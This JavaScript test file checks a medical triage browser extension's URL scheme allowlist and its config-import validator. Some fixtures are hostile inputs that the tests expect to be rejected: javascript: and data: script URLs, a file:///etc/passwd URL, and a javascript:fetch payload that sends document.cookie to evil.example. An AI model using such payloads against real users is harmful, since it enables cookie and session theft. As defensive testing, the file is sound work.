// Medicus Suite — Triage Lens attack-surface fixes (Phase 0 item 0.4,
// docs/plans/TRIAGE-LENS-2026-07-02.md)
// Run with: node test-triage-import-validation.js
//
// Two fixes under test:
//
//  1. executeAction URL scheme allowlist (content.js ~1935) — action.url from
//     config is opened with window.open; javascript:/data: URLs must be
//     rejected. content.js's isSafeActionUrl() is vm-extracted (same pattern
//     as test-monitoring-chip.js extracting selectMonitoringDue) and exercised
//     directly, plus options.js's validateTriageRule() mirror of the same
//     check (defence in depth for the rule editor / LLM importer).
//
//  2. Backup import validation (options.js ~1002-1057) — the file-import and
//     "Save pasted JSON" handlers previously accepted anything with
//     Array.isArray(parsed.rules). Both now route through the shared
//     validateImportedConfig() helper, vm-extracted here and exercised
//     against valid and malicious configs.

'use strict';

const fs = require('fs');
const path = require('path');
const vm = require('vm');

let passed = 0,
  failed = 0;
function check(cond, msg) {
  if (cond) {
    console.log(`  OK  ${msg}`);
    passed++;
  } else {
    console.error(`  FAIL  ${msg}`);
    failed++;
  }
}

// ============================================================
// PART 1 — content.js isSafeActionUrl (scheme allowlist at the click site)
// ============================================================
console.log('Part 1: content.js isSafeActionUrl (executeAction scheme allowlist)');

const contentSrc = fs.readFileSync(path.join(__dirname, 'content-scripts', 'triage-lens', 'content.js'), 'utf8');

const contentFnMatch = contentSrc.match(/const isSafeActionUrl = \(url\) => \{[\s\S]*?\n  \};/);
check(!!contentFnMatch, 'isSafeActionUrl found in content.js');

let contentIsSafeActionUrl = null;
if (contentFnMatch) {
  const sandbox = { URL };
  vm.createContext(sandbox);
  vm.runInContext(contentFnMatch[0] + '\nthis.isSafeActionUrl = isSafeActionUrl;', sandbox);
  contentIsSafeActionUrl = sandbox.isSafeActionUrl;
  check(typeof contentIsSafeActionUrl === 'function', 'isSafeActionUrl extracted and callable');
}

// Also confirm executeAction actually calls the guard before window.open — a
// source-grep parity check like test-triage-preview-parity.js's, so this test
// fails if the call site is ever unwired from the helper.
check(
  /if \(action\.type === 'link' && action\.url\) \{\s*\n\s*if \(!isSafeActionUrl\(action\.url\)\)/.test(contentSrc),
  'executeAction calls isSafeActionUrl(action.url) before opening a link action'
);
check(/window\.open\(action\.url/.test(contentSrc), 'window.open(action.url…) call site still present');

if (contentIsSafeActionUrl) {
  check(contentIsSafeActionUrl('https://cks.nice.org.uk/topics/uti'), 'https:// URL allowed');
  check(contentIsSafeActionUrl('http://example.nhs.uk/pathway'), 'http:// URL allowed');
  check(!contentIsSafeActionUrl('javascript:alert(1)'), 'javascript: URL rejected');
  check(!contentIsSafeActionUrl('data:text/html,<script>alert(1)</script>'), 'data: URL rejected');
  check(!contentIsSafeActionUrl('vbscript:msgbox(1)'), 'vbscript: URL rejected');
  check(!contentIsSafeActionUrl('not a url'), 'malformed URL (unparseable) rejected');
  check(!contentIsSafeActionUrl(''), 'empty string rejected');
  check(!contentIsSafeActionUrl(undefined), 'undefined rejected, does not throw');
  check(!contentIsSafeActionUrl('//example.com/no-scheme'), 'protocol-relative URL (no scheme) rejected');
  check(!contentIsSafeActionUrl('file:///etc/passwd'), 'file: URL rejected');
}

// ============================================================
// PART 2 — options.js validators (rule editor + import)
// ============================================================
console.log('\nPart 2: options.js validateTriageRule / validateImportedConfig');

const optsSrc = fs.readFileSync(path.join(__dirname, 'content-scripts', 'triage-lens', 'options.js'), 'utf8');

const fieldsBlockMatch = optsSrc.match(/const FIELDS = \[[\s\S]*?\n  \];\n  const PAGES = \[[\s\S]*?\n  \];/);
check(!!fieldsBlockMatch, 'FIELDS/PAGES block found in options.js');

const validatorsBlockMatch = optsSrc.match(
  /const ALLOWED_KINDS = [\s\S]*?const validateImportedConfig = \(parsed, currentConfig\) => \{[\s\S]*?\n  \};/
);
check(!!validatorsBlockMatch, 'validator block (ALLOWED_* … validateImportedConfig) found in options.js');

let validateTriageRule = null;
let validateImportedConfig = null;
let optsIsSafeActionUrl = null;

if (fieldsBlockMatch && validatorsBlockMatch) {
  const resultRules = require('./engine/result-rules.js');
  const sandbox = {
    URL,
    window: { SentinelResultRules: resultRules },
  };
  vm.createContext(sandbox);
  const src =
    fieldsBlockMatch[0] +
    '\n' +
    validatorsBlockMatch[0] +
    '\nthis.validateTriageRule = validateTriageRule;' +
    '\nthis.validateImportedConfig = validateImportedConfig;' +
    '\nthis.isSafeActionUrl = isSafeActionUrl;';
  vm.runInContext(src, sandbox, { filename: 'options-extract.js' });
  validateTriageRule = sandbox.validateTriageRule;
  validateImportedConfig = sandbox.validateImportedConfig;
  optsIsSafeActionUrl = sandbox.isSafeActionUrl;
  check(typeof validateTriageRule === 'function', 'validateTriageRule extracted and callable');
  check(typeof validateImportedConfig === 'function', 'validateImportedConfig extracted and callable');
  check(typeof optsIsSafeActionUrl === 'function', 'options.js isSafeActionUrl extracted and callable');
}

// ── Fixtures ─────────────────────────────────────────────────────────────────

function goodRule(over) {
  return {
    id: 'r1',
    kind: 'amber',
    label: 'Test rule',
    patterns: ['cough'],
    fields: ['request'],
    pages: ['queue'],
    actions: [],
    ...over,
  };
}

function goodResultRule(over) {
  return {
    id: 'rr1',
    label: 'Test result rule',
    kind: 'threshold',
    analyte: { match: ['potassium'] },
    comparator: 'above',
    red: 6.5,
    amber: 6.0,
    ...over,
  };
}

function goodConfig(over) {
  return {
    version: 5,
    rules: [goodRule()],
    resultRules: [goodResultRule()],
    thresholds: { staleDays: 90 },
    prefs: { theme: 'light' },
    systemChips: {},
    ...over,
  };
}

// ── 2a. validateTriageRule: link action URL scheme (defence in depth) ────────
if (validateTriageRule) {
  console.log('\n--- validateTriageRule: link action scheme allowlist ---');
  {
    const rule = goodRule({ actions: [{ type: 'link', label: 'NICE', url: 'https://cks.nice.org.uk' }] });
    check(validateTriageRule(rule).length === 0, 'https:// action url passes validation');
  }
  {
    const rule = goodRule({ actions: [{ type: 'link', label: 'evil', url: 'javascript:alert(document.cookie)' }] });
    const errs = validateTriageRule(rule);
    check(errs.length > 0, 'javascript: action url rejected by validateTriageRule');
    check(
      errs.some((e) => /http/.test(e)),
      'error message names the http(s) requirement'
    );
  }
  {
    const rule = goodRule({ actions: [{ type: 'snippet', label: 'x', text: 'copy me' }] });
    check(validateTriageRule(rule).length === 0, 'non-link action (snippet) unaffected by URL check');
  }
}

// ── 2b. options.js isSafeActionUrl matches content.js's behaviour ────────────
if (optsIsSafeActionUrl && contentIsSafeActionUrl) {
  console.log('\n--- options.js isSafeActionUrl parity with content.js ---');
  const cases = ['https://example.com', 'javascript:alert(1)', 'data:text/html,x', '', 'not a url', undefined];
  for (const c of cases) {
    check(
      optsIsSafeActionUrl(c) === contentIsSafeActionUrl(c),
      `options.js and content.js agree on isSafeActionUrl(${JSON.stringify(c)})`
    );
  }
}

// ── 2c. validateImportedConfig: happy path ────────────────────────────────────
if (validateImportedConfig) {
  console.log('\n--- validateImportedConfig: valid config ---');
  {
    const cfg = goodConfig();
    const { errors, normalized } = validateImportedConfig(cfg, { version: 3 });
    check(Array.isArray(errors) && errors.length === 0, 'a fully valid config passes with no errors');
    check(!!normalized, 'valid config returns a normalized object');
    check(normalized.version === 5, 'a valid numeric version is preserved as-is');
    check(normalized.rules.length === 1, 'rules array carried through unchanged');
    check(normalized.resultRules.length === 1, 'resultRules array carried through unchanged');
    check(JSON.stringify(normalized.rules) === JSON.stringify(cfg.rules), 'rules content byte-identical');
    check(
      JSON.stringify(normalized.thresholds) === JSON.stringify(cfg.thresholds),
      'thresholds content byte-identical'
    );
  }
  {
    // Minimal config: only rules present, everything else omitted.
    const cfg = { version: 1, rules: [goodRule()] };
    const { errors } = validateImportedConfig(cfg, { version: 1 });
    check(errors.length === 0, 'minimal config (rules only, no resultRules/thresholds/prefs/systemChips) is valid');
  }

  console.log('\n--- validateImportedConfig: shape rejections ---');
  {
    const { errors } = validateImportedConfig(null, { version: 1 });
    check(errors.length > 0, 'null input rejected');
  }
  {
    const { errors } = validateImportedConfig([1, 2, 3], { version: 1 });
    check(errors.length > 0, 'array input (not an object) rejected');
  }
  {
    const { errors } = validateImportedConfig({ rules: 'not-an-array' }, { version: 1 });
    check(errors.length > 0, 'non-array rules rejected');
    check(
      errors.some((e) => /rules must be an array/.test(e)),
      'error names "rules must be an array"'
    );
  }
  {
    // Bad rule kind — must be rejected wholesale, naming the offending rule.
    const badRule = goodRule({ id: 'bad-1', label: 'Bad Rule', kind: 'not-a-kind' });
    const cfg = goodConfig({ rules: [goodRule({ id: 'ok-1' }), badRule] });
    const { errors, normalized } = validateImportedConfig(cfg, { version: 1 });
    check(errors.length > 0, 'a rule with an invalid kind is rejected');
    check(!normalized, 'invalid config returns no normalized object (nothing to persist)');
    check(
      errors.some((e) => e.includes('rules[1]') && e.includes('Bad Rule')),
      'error names the offending rule index and label (got: ' + errors[0] + ')'
    );
  }
  {
    // Non-array resultRules — must be rejected even though rules[] is fine.
    const cfg = goodConfig({ resultRules: { not: 'an array' } });
    const { errors, normalized } = validateImportedConfig(cfg, { version: 1 });
    check(errors.length > 0, 'non-array resultRules rejected');
    check(!normalized, 'non-array resultRules import produces no normalized config');
    check(
      errors.some((e) => /resultRules must be an array/.test(e)),
      'error names "resultRules must be an array"'
    );
  }
  {
    // Bad result rule (missing analyte.match) — validated via SentinelResultRules.
    const badResultRule = goodResultRule({ id: 'bad-rr', label: 'Bad Result Rule', analyte: { match: [] } });
    const cfg = goodConfig({ resultRules: [badResultRule] });
    const { errors, normalized } = validateImportedConfig(cfg, { version: 1 });
    check(errors.length > 0, 'a resultRule failing SentinelResultRules.validateResultRule is rejected');
    check(!normalized, 'invalid resultRules import produces no normalized config');
    check(
      errors.some((e) => e.includes('resultRules[0]') && e.includes('Bad Result Rule')),
      'error names the offending result rule index and label (got: ' + errors[0] + ')'
    );
  }
  {
    // thresholds with a non-finite value.
    const cfg = goodConfig({ thresholds: { staleDays: 90, badOne: NaN } });
    const { errors, normalized } = validateImportedConfig(cfg, { version: 1 });
    check(errors.length > 0, 'thresholds containing a non-finite (NaN) value is rejected');
    check(!normalized, 'invalid thresholds import produces no normalized config');
  }
  {
    const cfg = goodConfig({ thresholds: { badOne: Infinity } });
    const { errors } = validateImportedConfig(cfg, { version: 1 });
    check(errors.length > 0, 'thresholds containing Infinity is rejected');
  }
  {
    const cfg = goodConfig({ thresholds: 'not-an-object' });
    const { errors } = validateImportedConfig(cfg, { version: 1 });
    check(errors.length > 0, 'thresholds as a non-object is rejected');
  }
  {
    const cfg = goodConfig({ thresholds: [1, 2, 3] });
    const { errors } = validateImportedConfig(cfg, { version: 1 });
    check(errors.length > 0, 'thresholds as an array is rejected (isPlainObject excludes arrays)');
  }
  {
    const cfg = goodConfig({ prefs: 'nope' });
    const { errors } = validateImportedConfig(cfg, { version: 1 });
    check(errors.length > 0, 'prefs as a non-object is rejected');
  }
  {
    const cfg = goodConfig({ systemChips: 'nope' });
    const { errors } = validateImportedConfig(cfg, { version: 1 });
    check(errors.length > 0, 'systemChips as a non-object is rejected');
  }
  {
    // javascript: action URL reaching import via a rule's actions array.
    const evilRule = goodRule({
      id: 'evil-1',
      label: 'Evil rule',
      actions: [{ type: 'link', label: 'click me', url: 'javascript:fetch("//evil.example/"+document.cookie)' }],
    });
    const cfg = goodConfig({ rules: [evilRule] });
    const { errors, normalized } = validateImportedConfig(cfg, { version: 1 });
    check(errors.length > 0, 'an imported rule with a javascript: action URL is rejected');
    check(!normalized, 'javascript: URL import produces no normalized config (nothing partially persisted)');
  }

  console.log('\n--- validateImportedConfig: version normalisation ---');
  {
    // Missing version -> falls back to current CONFIG.version, not 0/undefined.
    const cfg = goodConfig();
    delete cfg.version;
    const { errors, normalized } = validateImportedConfig(cfg, { version: 42 });
    check(errors.length === 0, 'config with missing version is otherwise valid');
    check(normalized.version === 42, 'missing version falls back to current CONFIG.version (42), not 0');
  }
  {
    // Invalid (string, non-numeric) version -> falls back to current CONFIG.version.
    const cfg = goodConfig({ version: 'not-a-number' });
    const { normalized } = validateImportedConfig(cfg, { version: 7 });
    check(normalized.version === 7, 'non-numeric version string falls back to current CONFIG.version (7)');
  }
  {
    // Numeric-looking string version IS coerced (Number('12') is finite) — accepted as 12.
    const cfg = goodConfig({ version: '12' });
    const { normalized } = validateImportedConfig(cfg, { version: 7 });
    check(normalized.version === 12, 'numeric-string version is coerced to the number (12)');
  }
  {
    // A genuinely low but valid numeric version is left as-is (not forced up) —
    // existing "import an old backup, it catches up on next load" behaviour.
    const cfg = goodConfig({ version: 1 });
    const { normalized } = validateImportedConfig(cfg, { version: 99 });
    check(normalized.version === 1, 'a genuinely low numeric version is preserved, not bumped to current');
  }
  {
    // No currentConfig supplied and missing version -> falls back to 0, never throws.
    const cfg = goodConfig();
    delete cfg.version;
    const { normalized } = validateImportedConfig(cfg, null);
    check(normalized.version === 0, 'missing version with no currentConfig falls back to 0 without throwing');
  }
}

// ============================================================
// PART 3 — call-site parity: both import handlers route through the helper
// ============================================================
console.log('\nPart 3: import handlers route through validateImportedConfig');

check(
  /\$\('#importFile'\)\.addEventListener\('change'[\s\S]{0,400}validateImportedConfig\(parsed, CONFIG\)/.test(optsSrc),
  'file-import handler calls validateImportedConfig(parsed, CONFIG)'
);
check(
  /\$\('#btnSaveJson'\)\.addEventListener\('click'[\s\S]{0,300}validateImportedConfig\(parsed, CONFIG\)/.test(optsSrc),
  '"Save pasted JSON" handler calls validateImportedConfig(parsed, CONFIG)'
);
check(
  !/Array\.isArray\(parsed\.rules\)\) throw new Error/.test(optsSrc),
  'neither import handler still short-circuits on a bare Array.isArray(parsed.rules) check'
);

console.log(`\n${passed} passed, ${failed} failed`);
if (failed > 0) process.exit(1);
